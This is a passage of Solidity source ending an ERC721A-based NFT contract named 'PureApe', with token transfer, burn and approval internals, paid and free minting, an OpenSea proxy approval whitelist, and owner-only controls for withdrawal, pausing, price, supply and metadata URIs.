1095         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1096 
1097         // Overflows are incredibly unrealistic.
1098         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1099         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1100         unchecked {
1101             _addressData[to].balance += uint64(quantity);
1102             _addressData[to].numberMinted += uint64(quantity);
1103 
1104             _ownerships[startTokenId].addr = to;
1105             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1106 
1107             uint256 updatedIndex = startTokenId;
1108             uint256 end = updatedIndex + quantity;
1109 
1110             if (safe && to.isContract()) {
1111                 do {
1112                     emit Transfer(address(0), to, updatedIndex);
1113                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1114                         revert TransferToNonERC721ReceiverImplementer();
1115                     }
1116                 } while (updatedIndex != end);
1117                 // Reentrancy protection
1118                 if (_currentIndex != startTokenId) revert();
1119             } else {
1120                 do {
1121                     emit Transfer(address(0), to, updatedIndex++);
1122                 } while (updatedIndex != end);
1123             }
1124             _currentIndex = updatedIndex;
1125         }
1126         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1127     }
1128 
1129     /**
1130      * @dev Transfers `tokenId` from `from` to `to`.
1131      *
1132      * Requirements:
1133      *
1134      * - `to` cannot be the zero address.
1135      * - `tokenId` token must be owned by `from`.
1136      *
1137      * Emits a {Transfer} event.
1138      */
1139     function _transfer(
1140         address from,
1141         address to,
1142         uint256 tokenId
1143     ) private {
1144         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1145 
1146         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1147             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1148             getApproved(tokenId) == _msgSender());
1149 
1150         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1151         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1152         if (to == address(0)) revert TransferToZeroAddress();
1153 
1154         _beforeTokenTransfers(from, to, tokenId, 1);
1155 
1156         // Clear approvals from the previous owner
1157         _approve(address(0), tokenId, prevOwnership.addr);
1158 
1159         // Underflow of the sender's balance is impossible because we check for
1160         // ownership above and the recipient's balance can't realistically overflow.
1161         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1162         unchecked {
1163             _addressData[from].balance -= 1;
1164             _addressData[to].balance += 1;
1165 
1166             _ownerships[tokenId].addr = to;
1167             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1168 
1169             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1170             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1171             uint256 nextTokenId = tokenId + 1;
1172             if (_ownerships[nextTokenId].addr == address(0)) {
1173                 // This will suffice for checking _exists(nextTokenId),
1174                 // as a burned slot cannot contain the zero address.
1175                 if (nextTokenId < _currentIndex) {
1176                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1177                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1178                 }
1179             }
1180         }
1181 
1182         emit Transfer(from, to, tokenId);
1183         _afterTokenTransfers(from, to, tokenId, 1);
1184     }
1185 
1186     /**
1187      * @dev Destroys `tokenId`.
1188      * The approval is cleared when the token is burned.
1189      *
1190      * Requirements:
1191      *
1192      * - `tokenId` must exist.
1193      *
1194      * Emits a {Transfer} event.
1195      */
1196     function _burn(uint256 tokenId) internal virtual {
1197         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1198 
1199         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1200 
1201         // Clear approvals from the previous owner
1202         _approve(address(0), tokenId, prevOwnership.addr);
1203 
1204         // Underflow of the sender's balance is impossible because we check for
1205         // ownership above and the recipient's balance can't realistically overflow.
1206         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1207         unchecked {
1208             _addressData[prevOwnership.addr].balance -= 1;
1209             _addressData[prevOwnership.addr].numberBurned += 1;
1210 
1211             // Keep track of who burned the token, and the timestamp of burning.
1212             _ownerships[tokenId].addr = prevOwnership.addr;
1213             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1214             _ownerships[tokenId].burned = true;
1215 
1216             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1217             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1218             uint256 nextTokenId = tokenId + 1;
1219             if (_ownerships[nextTokenId].addr == address(0)) {
1220                 // This will suffice for checking _exists(nextTokenId),
1221                 // as a burned slot cannot contain the zero address.
1222                 if (nextTokenId < _currentIndex) {
1223                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1224                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1225                 }
1226             }
1227         }
1228 
1229         emit Transfer(prevOwnership.addr, address(0), tokenId);
1230         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1231 
1232         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1233         unchecked {
1234             _burnCounter++;
1235         }
1236     }
1237 
1238     /**
1239      * @dev Approve `to` to operate on `tokenId`
1240      *
1241      * Emits a {Approval} event.
1242      */
1243     function _approve(
1244         address to,
1245         uint256 tokenId,
1246         address owner
1247     ) private {
1248         _tokenApprovals[tokenId] = to;
1249         emit Approval(owner, to, tokenId);
1250     }
1251 
1252     /**
1253      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1254      *
1255      * @param from address representing the previous owner of the given token ID
1256      * @param to target address that will receive the tokens
1257      * @param tokenId uint256 ID of the token to be transferred
1258      * @param _data bytes optional data to send along with the call
1259      * @return bool whether the call correctly returned the expected magic value
1260      */
1261     function _checkContractOnERC721Received(
1262         address from,
1263         address to,
1264         uint256 tokenId,
1265         bytes memory _data
1266     ) private returns (bool) {
1267         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1268             return retval == IERC721Receiver(to).onERC721Received.selector;
1269         } catch (bytes memory reason) {
1270             if (reason.length == 0) {
1271                 revert TransferToNonERC721ReceiverImplementer();
1272             } else {
1273                 assembly {
1274                     revert(add(32, reason), mload(reason))
1275                 }
1276             }
1277         }
1278     }
1279 
1280     /**
1281      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1282      * And also called before burning one token.
1283      *
1284      * startTokenId - the first token id to be transferred
1285      * quantity - the amount to be transferred
1286      *
1287      * Calling conditions:
1288      *
1289      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1290      * transferred to `to`.
1291      * - When `from` is zero, `tokenId` will be minted for `to`.
1292      * - When `to` is zero, `tokenId` will be burned by `from`.
1293      * - `from` and `to` are never both zero.
1294      */
1295     function _beforeTokenTransfers(
1296         address from,
1297         address to,
1298         uint256 startTokenId,
1299         uint256 quantity
1300     ) internal virtual {}
1301 
1302     /**
1303      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1304      * minting.
1305      * And also called after one token has been burned.
1306      *
1307      * startTokenId - the first token id to be transferred
1308      * quantity - the amount to be transferred
1309      *
1310      * Calling conditions:
1311      *
1312      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1313      * transferred to `to`.
1314      * - When `from` is zero, `tokenId` has been minted for `to`.
1315      * - When `to` is zero, `tokenId` has been burned by `from`.
1316      * - `from` and `to` are never both zero.
1317      */
1318     function _afterTokenTransfers(
1319         address from,
1320         address to,
1321         uint256 startTokenId,
1322         uint256 quantity
1323     ) internal virtual {}
1324 }
1325 
1326 
1327 
1328 contract PureApe is ERC721A, Owneable {
1329 
1330     string public baseURI = "";
1331     string public contractURI = "ipfs://";
1332     string public constant baseExtension = ".json";
1333     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1334 
1335     uint256 public constant MAX_PER_TX_FREE = 10;
1336     uint256 public constant FREE_MAX_SUPPLY = 1000;
1337     uint256 public constant MAX_PER_TX = 10;
1338     uint256 public MAX_SUPPLY = 4444;
1339     uint256 public price = 0.0069 ether;
1340 
1341     bool public paused = true;
1342 
1343     constructor() ERC721A("PureApe", "APES") {}
1344 
1345     function mint(uint256 _amount) external payable {
1346         address _caller = _msgSender();
1347         require(!paused, "Paused");
1348         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1349         require(_amount > 0, "No 0 mints");
1350         require(tx.origin == _caller, "No contracts");
1351         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1352         
1353       if(FREE_MAX_SUPPLY >= totalSupply()){
1354             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1355         }else{
1356             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1357             require(_amount * price == msg.value, "Invalid funds provided");
1358         }
1359 
1360 
1361         _safeMint(_caller, _amount);
1362     }
1363 
1364     function isApprovedForAll(address owner, address operator)
1365         override
1366         public
1367         view
1368         returns (bool)
1369     {
1370         // Whitelist OpenSea proxy contract for easy trading.
1371         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1372         if (address(proxyRegistry.proxies(owner)) == operator) {
1373             return true;
1374         }
1375 
1376         return super.isApprovedForAll(owner, operator);
1377     }
1378 
1379     function withdraw() external onlyOwner {
1380         uint256 balance = address(this).balance;
1381         (bool success, ) = _msgSender().call{value: balance}("");
1382         require(success, "Failed to send");
1383     }
1384 
1385     function config() external onlyOwner {
1386         _safeMint(_msgSender(), 1);
1387     }
1388 
1389     function pause(bool _state) external onlyOwner {
1390         paused = _state;
1391     }
1392 
1393     function setBaseURI(string memory baseURI_) external onlyOwner {
1394         baseURI = baseURI_;
1395     }
1396 
1397     function setContractURI(string memory _contractURI) external onlyOwner {
1398         contractURI = _contractURI;
1399     }
1400 
1401     function setPrice(uint256 newPrice) public onlyOwner {
1402         price = newPrice;
1403     }
1404 
1405     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1406         MAX_SUPPLY = newSupply;
1407     }
1408 
1409     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1410         require(_exists(_tokenId), "Token does not exist.");
1411         return bytes(baseURI).length > 0 ? string(
1412             abi.encodePacked(
1413               baseURI,
1414               Strings.toString(_tokenId),
1415               baseExtension
1416             )
1417         ) : "";
1418     }
1419 }
1420 
1421 contract OwnableDelegateProxy { }
1422 contract ProxyRegistry {
1423     mapping(address => OwnableDelegateProxy) public proxies;
1424 }